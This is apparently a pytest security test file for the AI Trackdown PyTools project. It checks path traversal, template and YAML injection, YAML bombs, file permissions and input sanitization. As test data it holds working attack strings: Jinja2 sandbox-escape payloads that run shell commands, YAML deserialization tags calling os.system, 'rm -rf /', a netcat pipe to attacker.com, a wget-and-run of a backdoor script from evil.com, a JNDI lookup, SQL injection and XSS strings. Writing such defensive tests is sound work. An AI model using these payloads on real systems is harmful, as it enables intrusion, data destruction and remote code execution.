"""Security-focused edge case tests for AI Trackdown PyTools.

This test suite specifically focuses on security boundary testing:
- Path traversal attack prevention
- Template injection prevention
- YAML bomb prevention
- File system security boundary testing
- Input sanitization edge cases
- Privilege escalation prevention
"""

import os
import tempfile
import time
from pathlib import Path
from unittest.mock import patch

import pytest
import yaml

from ai_trackdown_pytools.core.config import Config
from ai_trackdown_pytools.utils.frontmatter import FrontmatterParser
from ai_trackdown_pytools.utils.templates import TemplateManager
from ai_trackdown_pytools.utils.validation import SchemaValidator


class TestPathTraversalPrevention:
    """Test prevention of path traversal attacks."""

    def test_config_path_traversal_prevention(self, temp_dir: Path):
        """Test that config loading prevents path traversal."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "....//....//....//etc//passwd",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "\\\\server\\share\\file",
        ]

        for malicious_path in malicious_paths:
            try:
                # Test that paths are properly constrained
                config_path = temp_dir / malicious_path
                resolved_path = config_path.resolve()

                # Should not escape temp directory
                assert str(resolved_path).startswith(str(temp_dir.resolve()))

                # Test config creation with malicious path
                try:
                    Config.create_default(config_path)
                    # If it succeeds, file should be within temp_dir
                    if config_path.exists():
                        assert str(config_path.resolve()).startswith(
                            str(temp_dir.resolve())
                        )
                except (ValueError, OSError, FileNotFoundError):
                    # Expected for malicious paths
                    pass

            except (ValueError, OSError) as e:
                # Expected for some malicious inputs
                assert "path" in str(e).lower() or "permission" in str(e).lower()

    def test_template_path_traversal_prevention(self, temp_dir: Path):
        """Test that template loading prevents path traversal."""
        template_manager = TemplateManager()

        malicious_template_names = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "/etc/passwd",
            "C:/Windows/System32/config/SAM",
            "../../../../sensitive_file",
        ]

        with patch.object(template_manager, "_template_dirs", [temp_dir / "templates"]):
            for malicious_name in malicious_template_names:
                # Should not load files outside template directories
                result = template_manager.load_template("task", malicious_name)
                assert result is None  # Should fail to load

    def test_frontmatter_file_path_traversal(self, temp_dir: Path):
        """Test frontmatter parser path traversal prevention."""
        parser = FrontmatterParser()

        malicious_files = [
            temp_dir / "../../../etc/passwd",
            temp_dir / "..\\..\\..\\windows\\system32\\config",
            temp_dir / "normal_file/../../../etc/passwd",
        ]

        for malicious_file in malicious_files:
            try:
                # Should not read files outside allowed directories
                frontmatter, content, result = parser.parse_file(malicious_file)

                # If it doesn't raise an exception, the resolved path should be safe
                resolved_path = malicious_file.resolve()
                # Should not access system files
                assert not str(resolved_path).startswith("/etc")
                assert not str(resolved_path).startswith("C:\\Windows")

            except (FileNotFoundError, PermissionError, OSError):
                # Expected for malicious paths
                pass

    def test_symlink_attack_prevention(self, temp_dir: Path):
        """Test prevention of symlink-based attacks."""
        if (
            os.name == "nt"
        ):  # Skip on Windows where symlinks require special permissions
            pytest.skip("Symlink test skipped on Windows")

        # Create a sensitive file outside temp_dir
        sensitive_dir = temp_dir.parent / "sensitive"
        sensitive_dir.mkdir(exist_ok=True)
        sensitive_file = sensitive_dir / "secret.txt"
        sensitive_file.write_text("SECRET_CONTENT")

        try:
            # Create symlink to sensitive file
            symlink_path = temp_dir / "innocent_looking_file.md"
            symlink_path.symlink_to(sensitive_file)

            # Should not follow symlinks to sensitive files
            parser = FrontmatterParser()

            try:
                frontmatter, content, result = parser.parse_file(symlink_path)
                # If successful, should not contain sensitive content
                assert "SECRET_CONTENT" not in content
            except (OSError, FileNotFoundError):
                # Expected if symlink following is prevented
                pass

        finally:
            # Cleanup
            try:
                if symlink_path.exists():
                    symlink_path.unlink()
                if sensitive_file.exists():
                    sensitive_file.unlink()
                if sensitive_dir.exists():
                    sensitive_dir.rmdir()
            except OSError:
                pass


class TestTemplateInjectionPrevention:
    """Test prevention of template injection attacks."""

    def test_jinja2_injection_prevention(self):
        """Test prevention of Jinja2 template injection."""

        malicious_templates = [
            "{{ config.__class__.__module__ }}",
            "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            "{{ self.__init__.__globals__ }}",
            "{{ request.__class__ }}",
            "{{ config.__class__.__bases__[0].__subclasses__() }}",
            "{% for item in config.__dict__ %}{{ item }}{% endfor %}",
            "{{ cycler.__init__.__globals__.os.popen('whoami').read() }}",
            "{{ lipsum.__globals__.__builtins__.__import__('os').system('id') }}",
            "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
        ]

        # Test each malicious template
        for malicious_template in malicious_templates:
            try:
                # Create template with sandbox environment
                from jinja2.sandbox import SandboxedEnvironment

                env = SandboxedEnvironment()
                template = env.from_string(malicious_template)

                # Render with minimal safe context
                safe_context = {
                    "title": "Safe Title",
                    "description": "Safe Description",
                }

                result = template.render(safe_context)

                # Should not expose dangerous information
                dangerous_strings = [
                    "__class__",
                    "__globals__",
                    "__import__",
                    "os.system",
                    "subprocess",
                    "eval",
                    "exec",
                    "__builtins__",
                ]

                for dangerous in dangerous_strings:
                    assert dangerous not in result

            except Exception:
                # Template might reject malicious content - this is good
                pass

    def test_yaml_injection_prevention(self, temp_dir: Path):
        """Test prevention of YAML injection attacks."""
        malicious_yaml_content = [
            # Python object instantiation
            """
!!python/object/apply:os.system
- "echo 'malicious code executed'"
""",
            # Arbitrary code execution
            """
!!python/object/apply:subprocess.check_output
- ["whoami"]
""",
            # File access
            """
!!python/object/apply:open
- "/etc/passwd"
- "r"
""",
            # Module import
            """
!!python/object/apply:__import__
- "os"
""",
        ]

        for i, malicious_content in enumerate(malicious_yaml_content):
            malicious_file = temp_dir / f"malicious_{i}.yaml"
            malicious_file.write_text(malicious_content)

            # Should use safe loader to prevent code execution
            try:
                with open(malicious_file) as f:
                    # Using safe_load should prevent dangerous deserialization
                    data = yaml.safe_load(f)

                    # If it loads without error, result should be safe
                    if data is not None:
                        assert not callable(data)
                        assert not hasattr(data, "__reduce__")

            except yaml.YAMLError:
                # Expected with malicious YAML
                pass

    def test_config_injection_prevention(self, temp_dir: Path):
        """Test prevention of configuration injection attacks."""
        malicious_configs = [
            # Template injection in config values
            {
                "project": {
                    "name": "{{ config.__class__.__module__ }}",
                    "command": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
                }
            },
            # Script injection
            {"editor": {"default": "rm -rf / ; vim", "command": "$(whoami)"}},
            # Path injection
            {
                "templates": {"directory": "../../../etc"},
                "tasks": {"directory": "/etc/passwd"},
            },
        ]

        for i, malicious_config in enumerate(malicious_configs):
            config_file = temp_dir / f"malicious_config_{i}.yaml"

            with open(config_file, "w") as f:
                yaml.dump(malicious_config, f)

            # Loading should be safe
            config = Config.load(config_file)

            # Values should not be executed as code
            project_name = config.get("project.name", "")
            assert "__class__" not in str(project_name)
            assert "whoami" not in str(config.get("editor.command", ""))


class TestYAMLBombPrevention:
    """Test prevention of YAML bomb attacks."""

    def test_billion_laughs_prevention(self, temp_dir: Path):
        """Test prevention of billion laughs YAML bomb."""
        # Billion laughs attack pattern
        billion_laughs = """
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
"""

        bomb_file = temp_dir / "yaml_bomb.yaml"
        bomb_file.write_text(billion_laughs)

        # Should not consume excessive memory/time
        start_time = time.time()
        start_memory = self._get_memory_usage()

        try:
            with open(bomb_file) as f:
                # Should timeout or limit resource usage
                import signal

                def timeout_handler(signum, frame):
                    raise TimeoutError("YAML parsing took too long")

                # Set 5 second timeout
                signal.signal(signal.SIGALRM, timeout_handler)
                signal.alarm(5)

                try:
                    data = yaml.safe_load(f)
                finally:
                    signal.alarm(0)  # Cancel alarm

        except (yaml.YAMLError, TimeoutError, MemoryError):
            # Expected for YAML bombs
            pass

        elapsed_time = time.time() - start_time
        memory_used = self._get_memory_usage() - start_memory

        # Should not take excessive time or memory
        assert elapsed_time < 10.0  # Should complete within 10 seconds
        assert memory_used < 100 * 1024 * 1024  # Should not use more than 100MB

    def test_quadratic_blowup_prevention(self, temp_dir: Path):
        """Test prevention of quadratic blowup attacks."""
        # Create content that could cause quadratic parsing time
        quadratic_content = "a: " + "x" * 10000 + "\n"
        quadratic_content += "b: " + "y" * 10000 + "\n"
        quadratic_content += "c: " + "z" * 10000 + "\n"

        bomb_file = temp_dir / "quadratic_bomb.yaml"
        bomb_file.write_text(quadratic_content)

        start_time = time.time()

        try:
            with open(bomb_file) as f:
                data = yaml.safe_load(f)

        except yaml.YAMLError:
            pass

        elapsed_time = time.time() - start_time
        assert elapsed_time < 5.0  # Should parse quickly

    def _get_memory_usage(self) -> int:
        """Get current memory usage in bytes."""
        try:
            import psutil

            process = psutil.Process()
            return process.memory_info().rss
        except ImportError:
            # psutil not available, return 0
            return 0


class TestPrivilegeEscalationPrevention:
    """Test prevention of privilege escalation attacks."""

    def test_file_permission_safety(self, temp_dir: Path):
        """Test that created files have safe permissions."""
        config_path = temp_dir / "config.yaml"
        Config.create_default(config_path)

        # Check file permissions
        file_mode = config_path.stat().st_mode & 0o777

        # Should not be world-writable (others cannot write)
        assert not (file_mode & 0o002)

        # Should not be group-writable unless intended
        if os.name != "nt":  # Unix-like systems
            assert not (file_mode & 0o020) or (
                file_mode & 0o040
            )  # Group write only if group read

    def test_directory_permission_safety(self, temp_dir: Path):
        """Test that created directories have safe permissions."""
        project_dir = temp_dir / "test_project"
        project_dir.mkdir()

        from ai_trackdown_pytools.core.project import Project

        project = Project.create(project_dir, name="Test Project")

        # Check directory permissions
        for dir_path in [
            project_dir / ".ai-trackdown",
            project_dir / "tasks",
            project_dir / ".ai-trackdown" / "templates",
        ]:
            if dir_path.exists():
                dir_mode = dir_path.stat().st_mode & 0o777

                # Should not be world-writable
                if os.name != "nt":  # Unix-like systems
                    assert not (dir_mode & 0o002)

    def test_temp_file_security(self, temp_dir: Path):
        """Test that temporary files are created securely."""

        # Test secure temp file creation
        with tempfile.NamedTemporaryFile(
            mode="w", dir=temp_dir, delete=False
        ) as temp_file:
            temp_path = Path(temp_file.name)
            temp_file.write("sensitive content")

        try:
            # Check permissions
            if os.name != "nt":  # Unix-like systems
                file_mode = temp_path.stat().st_mode & 0o777
                # Should be readable/writable only by owner
                assert file_mode == 0o600
        finally:
            temp_path.unlink()

    def test_command_injection_prevention(self):
        """Test prevention of command injection through config values."""
        malicious_commands = [
            "vim; rm -rf /",
            "notepad & del C:\\Windows\\*",
            "$(whoami)",
            "`id`",
            "editor | nc attacker.com 8080",
            "vim & wget http://evil.com/backdoor.sh | sh",
        ]

        for malicious_cmd in malicious_commands:
            config = Config()
            config.set("editor.default", malicious_cmd)

            # Should store value safely without execution
            stored_value = config.get("editor.default")
            assert stored_value == malicious_cmd  # Stored as-is, not executed


class TestInputSanitizationEdgeCases:
    """Test input sanitization edge cases."""

    def test_sql_injection_patterns(self):
        """Test that SQL injection patterns are handled safely."""
        validator = SchemaValidator()

        sql_injection_patterns = [
            "'; DROP TABLE tasks; --",
            "1' OR '1'='1",
            "admin'/*",
            "1; DELETE FROM users WHERE 1=1; --",
            "' UNION SELECT * FROM secrets --",
        ]

        for injection_pattern in sql_injection_patterns:
            task_data = {
                "id": "TSK-0001",
                "title": injection_pattern,
                "description": injection_pattern,
                "priority": "medium",
                "status": "open",
            }

            # Should handle safely without SQL execution
            result = validator.validate_task(task_data)
            # May be valid or invalid, but should not cause SQL injection

    def test_script_injection_patterns(self):
        """Test that script injection patterns are handled safely."""
        validator = SchemaValidator()

        script_patterns = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "onload=alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "data:text/html,<script>alert('xss')</script>",
        ]

        for script_pattern in script_patterns:
            task_data = {
                "id": "TSK-0001",
                "title": script_pattern,
                "description": script_pattern,
                "priority": "medium",
                "status": "open",
            }

            # Should handle safely without script execution
            result = validator.validate_task(task_data)
            # Should not execute scripts

    def test_format_string_attacks(self):
        """Test prevention of format string attacks."""
        format_strings = [
            "%s%s%s%s",
            "%n%n%n%n",
            "%x%x%x%x",
            "{0}{1}{2}{3}",
            "${jndi:ldap://evil.com/}",
        ]

        validator = SchemaValidator()

        for format_string in format_strings:
            task_data = {
                "id": "TSK-0001",
                "title": format_string,
                "description": format_string,
                "priority": "medium",
                "status": "open",
            }

            # Should not trigger format string vulnerabilities
            result = validator.validate_task(task_data)

    def test_buffer_overflow_patterns(self):
        """Test handling of potential buffer overflow patterns."""
        # Extremely long inputs that could cause buffer overflows
        overflow_patterns = [
            "A" * 10000,
            "%" * 5000,
            "\x00" * 1000,  # Null bytes
            "\xff" * 2000,  # High byte values
        ]

        validator = SchemaValidator()

        for pattern in overflow_patterns:
            task_data = {
                "id": "TSK-0001",
                "title": pattern[:100],  # Truncate for title
                "description": pattern,
                "priority": "medium",
                "status": "open",
            }

            # Should handle without crashing
            try:
                result = validator.validate_task(task_data)
            except Exception as e:
                # Should fail gracefully, not crash
                assert "buffer" not in str(e).lower()


class TestFileSystemSecurityBoundaries:
    """Test file system security boundaries."""

    def test_hidden_file_access_prevention(self, temp_dir: Path):
        """Test that hidden files are handled appropriately."""
        # Create hidden files
        hidden_files = [
            temp_dir / ".hidden_config",
            temp_dir / ".ssh_key",
            temp_dir / ".env",
            temp_dir / ".gitignore",  # This one might be legitimate
        ]

        for hidden_file in hidden_files:
            hidden_file.write_text("sensitive_content")

        # Test config loading doesn't access inappropriate hidden files
        config = Config()

        # Should not automatically discover hidden config files unless explicitly specified
        found_config = Config.find_config_file()
        if found_config:
            assert not found_config.name.startswith(".ssh")
            assert not found_config.name.startswith(".env")

    def test_special_device_file_prevention(self, temp_dir: Path):
        """Test prevention of access to special device files."""
        if os.name == "nt":
            pytest.skip("Device file test not applicable on Windows")

        special_files = [
            "/dev/null",
            "/dev/zero",
            "/dev/random",
            "/dev/urandom",
            "/proc/self/mem",
            "/proc/self/environ",
        ]

        parser = FrontmatterParser()

        for special_file in special_files:
            special_path = Path(special_file)
            if special_path.exists():
                try:
                    # Should handle device files appropriately
                    frontmatter, content, result = parser.parse_file(special_path)

                    # If successful, should not return infinite content
                    assert len(content) < 1000000  # Less than 1MB

                except (OSError, PermissionError):
                    # Expected for some device files
                    pass

    def test_network_file_access_prevention(self):
        """Test prevention of network file access."""
        network_paths = [
            "//server/share/file.txt",
            "\\\\server\\share\\file.txt",
            "ftp://server/file.txt",
            "http://server/file.txt",
            "smb://server/file.txt",
        ]

        parser = FrontmatterParser()

        for network_path in network_paths:
            try:
                # Should not attempt network access
                frontmatter, content, result = parser.parse_file(Path(network_path))

            except (FileNotFoundError, OSError, ValueError):
                # Expected for network paths
                pass

    def test_race_condition_file_access(self, temp_dir: Path):
        """Test prevention of race condition exploits in file access."""
        target_file = temp_dir / "race_target.md"
        target_file.write_text(
            """---
title: Original Content
---

Original file content.
"""
        )

        # Simulate race condition where file is modified during parsing
        import threading

        def modify_file():
            time.sleep(0.01)  # Small delay
            if target_file.exists():
                target_file.write_text(
                    """---
title: Modified Content  
---

Modified malicious content.
"""
                )

        parser = FrontmatterParser()

        # Start modification thread
        modify_thread = threading.Thread(target=modify_file)
        modify_thread.start()

        # Parse file
        try:
            frontmatter, content, result = parser.parse_file(target_file)
            # Should get consistent results

        finally:
            modify_thread.join()


# Test utilities for security testing
def create_malicious_yaml(temp_dir: Path, content: str) -> Path:
    """Create a malicious YAML file for testing."""
    malicious_file = temp_dir / "malicious.yaml"
    malicious_file.write_text(content)
    return malicious_file


def assert_no_code_execution(result: str):
    """Assert that result doesn't contain evidence of code execution."""
    dangerous_indicators = [
        "uid=",  # Unix user ID from whoami/id
        "gid=",  # Unix group ID
        "C:\\Users\\",  # Windows user directory
        "/home/",  # Unix home directory
        "root:",  # Root user indicator
        "admin:",  # Admin user indicator
    ]

    for indicator in dangerous_indicators:
        assert indicator not in result, f"Possible code execution detected: {indicator}"


def simulate_low_privilege_environment():
    """Simulate low privilege environment for testing."""
    # Mock os.getuid to simulate non-root user
    with patch("os.getuid", return_value=1000):
        with patch("os.getgid", return_value=1000):
            yield


# Security test configuration
pytest.mark.security = pytest.mark.skipif(
    os.environ.get("SKIP_SECURITY_TESTS") == "1", reason="Security tests skipped"
)
